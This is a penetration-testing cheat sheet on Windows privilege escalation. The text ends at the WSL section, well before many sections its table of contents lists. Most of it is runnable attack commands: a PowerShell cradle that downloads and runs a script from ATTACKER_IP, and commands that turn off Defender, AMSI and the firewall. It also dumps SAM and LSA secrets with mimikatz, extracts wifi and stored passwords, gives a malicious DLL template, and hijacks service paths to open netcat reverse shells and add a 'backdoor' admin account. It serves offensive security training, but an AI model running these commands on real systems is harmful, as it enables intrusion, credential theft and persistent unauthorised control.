# Windows - Privilege Escalation

## Summary

* [Tools](#tools)
* [Windows Version and Configuration](#windows-version-and-configuration)
* [User Enumeration](#user-enumeration)
* [Network Enumeration](#network-enumeration)
* [Antivirus & Detections](#antivirus--detections)
    * [Windows Defender](#windows-defender)
    * [Firewall](#firewall)
    * [AppLocker Enumeration](#applocker-enumeration)
    * [Powershell](#powershell)
    * [Default Writeable Folders](#default-writeable-folders)
* [EoP - Looting for passwords](#eop---looting-for-passwords)
    * [SAM and SYSTEM files](#sam-and-system-files)
    * [LAPS Settings](#laps-settings)
    * [HiveNightmare](#hivenightmare)
    * [Search for file contents](#search-for-file-contents)
    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
    * [Passwords in unattend.xml](#passwords-in-unattendxml)
    * [Wifi passwords](#wifi-passwords)
    * [Sticky Notes passwords](#sticky-notes-passwords)
    * [Passwords stored in services](#passwords-stored-in-services)
    * [Passwords stored in Key Manager](#passwords-stored-in-key-manager)
    * [Powershell History](#powershell-history)
    * [Powershell Transcript](#powershell-transcript)
    * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
* [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
* [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
* [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
* [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
* [EoP - $PATH Interception](#eop---path-interception)
* [EoP - Named Pipes](#eop---named-pipes)
* [EoP - Kernel Exploitation](#eop---kernel-exploitation)
* [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
* [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
* [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
* [EoP - Printers](#eop---printers)
    * [Universal Printer](#universal-printer)
    * [Bring Your Own Vulnerability](#bring-your-own-vulnerability)
* [EoP - Runas](#eop---runas)
* [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
* [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
* [EoP - Impersonation Privileges](#eop---impersonation-privileges)
    * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
    * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
    * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
    * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
    * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
* [EoP - Privileged File Write](#eop---privileged-file-write)
    * [DiagHub](#diaghub)
    * [UsoDLLLoader](#usodllloader)
    * [WerTrigger](#wertrigger)
* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
    * [MS08-067 (NetAPI)](#ms08-067-netapi)
    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
    * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
    * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
    * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
    * [CVE-2019-1388](#cve-2019-1388)
* [EoP - $PATH Interception](#eop---path-interception)
* [References](#references)

## Tools

- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
    ```powershell
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```
- [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
- [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
    ```powershell
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
    ```
- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
    ```powershell
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```
- [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
- [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
- [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
- [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
    ```powershell
    Seatbelt.exe -group=all -full
    Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
    Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
    ```
- [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
- [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
    ```powershell
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```
- [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
    ```powershell
    # First obtain systeminfo
    systeminfo
    systeminfo > systeminfo.txt
    # Then feed it to wesng
    python3 wes.py --update-wes
    python3 wes.py --update
    python3 wes.py systeminfo.txt
    ```
- [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
    ```powershell
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
    ```

## Windows Version and Configuration

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Extract patchs and updates
```powershell
wmic qfe
```

Architecture

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

List all env variables

```powershell
set
Get-ChildItem Env: | ft Key,Value
```

List all drives

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## User Enumeration

Get current username

```powershell
echo %USERNAME% || whoami
$env:username
```

List user privilege

```powershell
whoami /priv
whoami /groups
```

List all users

```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for bruteforcing

```powershell$env:usernadsc
net accounts
```

Get details about a user (i.e. administrator, admin, current user)

```powershell
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```powershell
net localgroup
Get-LocalGroup | ft Name
```

Get details about a group (i.e. administrators)

```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

Get Domain Controllers

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

## Network Enumeration

List all network interfaces, IP, and DNS.

```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

List current routing table

```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

List the ARP table

```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List all current connections

```powershell
netstat -ano
```

List all network shares

```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP Configuration

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## Antivirus & Detections

Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`

### Windows Defender

```powershell
# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Firewall

List firewall state and current configuration

```powershell
netsh advfirewall firewall dump
# or 
netsh firewall show state
netsh firewall show config
```

List firewall's blocked ports

```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Disable firewall

```powershell
# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```


### AppLocker Enumeration

- With the GPO
- `HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2` (Keys: Appx, Dll, Exe, Msi and Script).

* List AppLocker rules
    ```powershell
    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    ```

* AppLocker Bypass
    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md

### Powershell

Default powershell locations in a Windows system.

```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

#### Powershell Constrained Mode

* Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
* [bypass-clm - PowerShell Constrained Language Mode Bypass](https://github.com/calebstewart/bypass-clm)
* [PowerShdll - Powershell with no Powershell.exe via DLL's](https://github.com/p3nt4/PowerShdll): `rundll32.exe C:\temp\PowerShdll.dll,main`
* Other bypasses
    ```powershell
    PS > &{ whoami }
    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
    ```

#### AMSI Bypass

Find more AMSI bypass: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```


### Default Writeable Folders

```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

## EoP - Looting for passwords

### SAM and SYSTEM files

The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.

```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Generate a hash file for John using `pwdump` or `samdump2`.

```powershell
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.

### LAPS Settings

Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.

* LAPS Enabled: AdmPwdEnabled
* LAPS Admin Account Name: AdminAccountName
* LAPS Password Complexity: PasswordComplexity
* LAPS Password Length: PasswordLength
* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled

### HiveNightmare

> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user

Check for the vulnerability using `icacls`

```powershell
C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
```

Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.

```powershell
mimikatz> token::whoami /full

# List shadow copies available
mimikatz> misc::shadowcopies

# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```


### Search for file contents

```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

### Search for a file with a certain filename

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

### Search the registry for key names and passwords

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Read a value of a certain sub key

```powershell
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

### Passwords in unattend.xml

Location of the unattend.xml files.

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Display the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`.

Example content

```powershell
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

Unattend credentials are stored in base64 and can be decoded manually with base64.

```powershell
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*
```

The Metasploit module `post/windows/gather/enum_unattend` looks for these files.

### IIS Web config

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### Other files

```bat
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

### Wifi passwords

Find AP SSID
```bat
netsh wlan show profile
```

Get Cleartext Pass
```bat
netsh wlan show profile <SSID> key=clear
```

Oneliner method to extract wifi passwords from all the access point.

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### Sticky Notes passwords

The sticky notes app stores it's content in a sqlite db located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

### Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)


```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```


### Passwords stored in Key Manager

:warning: This software will display its output in a GUI

```ps1
rundll32 keymgr,KRShowKeyMgr
```

### Powershell History

Disable Powershell history: `Set-PSReadlineOption -HistorySaveStyle SaveNothing`.

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Powershell Transcript

```xml
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

### Password in Alternate Data Stream

```ps1
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag
```

## EoP - Processes Enumeration and Tasks

* What processes are running?
    ```powershell
    tasklist /v
    net start
    sc query
    Get-Service
    Get-Process
    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
    ```

* Which processes are running as "system"
    ```powershell
    tasklist /v /fi "username eq system"
    ```

* Do you have powershell magic?
    ```powershell
    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
    ```

* List installed programs
    ```powershell
    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    ```

* List services
    ```powershell
    net start
    wmic service list brief
    tasklist /SVC
    ```

* Enumerate scheduled tasks
    ```powershell
    schtasks /query /fo LIST 2>nul | findstr TaskName
    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
    ```

* Startup tasks
    ```powershell
    wmic startup get caption,command
    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
    ```

## EoP - Incorrect permissions in services

> A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.

Often, services are pointing to writeable locations:
- Orphaned installs, not installed anymore but still exist in startup
- DLL Hijacking
    ```powershell
    # find missing DLL 
    - Find-PathDLLHijack PowerUp.ps1
    - Process Monitor : check for "Name Not Found"

    # compile a malicious dll
    - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
    - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

    # content of windows_dll.c
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

- PATH directories with weak permissions
    ```powershell
    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
    ```

Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`

Note to check file permissions you can use `cacls` and `icacls`
> icacls (Windows Vista +)    
> cacls (Windows XP)

You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.

### Example with Windows 10 - CVE-2019-1322 UsoSvc

Prerequisite: Service account

```powershell
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```

### Example with Windows XP SP1 - upnphost

```powershell
# NOTE: spaces are mandatory for this exploit to work !
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

If it fails because of a missing dependency, try the following commands.

```powershell
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals or [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe)

```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>
```

## EoP - Windows Subsystem for Linux (WSL)

Technique borrowed from [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)

> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ <distro>.exe --default-user root. Now start your bind shell or reverse.


